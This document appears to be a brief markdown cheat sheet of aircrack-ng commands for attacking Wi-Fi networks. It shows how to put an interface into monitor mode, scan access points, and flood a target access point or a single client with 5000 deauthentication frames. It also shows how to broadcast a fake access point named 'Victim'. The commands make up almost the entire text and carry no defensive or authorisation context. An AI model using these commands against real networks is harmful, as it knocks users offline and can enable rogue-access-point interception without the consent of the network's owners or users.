## Deauth Attack
Set interface into monitor mode
```txt
sudo airmon-ng start wlan1
```
Scan nearby Access Points
```
sudo airodump-ng wlan1 
```
Scan specific AP
```
sudo airodump-ng --bssid <Target AP> --channel <Select channel number of target AP> wlan1
```
Set wifi interface channel same as target AP
```
sudo iwconfig wlan1 channel <Select channel number of target AP>
```
Start deauth attack for target AP
```
sudo aireplay-ng -0 5000 -a <Target BSSID mac address> wlan1 
```
Start deauth attack for specific client of target AP
```
sudo aireplay-ng --deauth 5000 -a <BSSID of target AP> -c <BSSID of target client> wlan1
```
## Creating Fake SSID
```
sudo airbase-ng -e "Victim" -c 1 wlan2
```
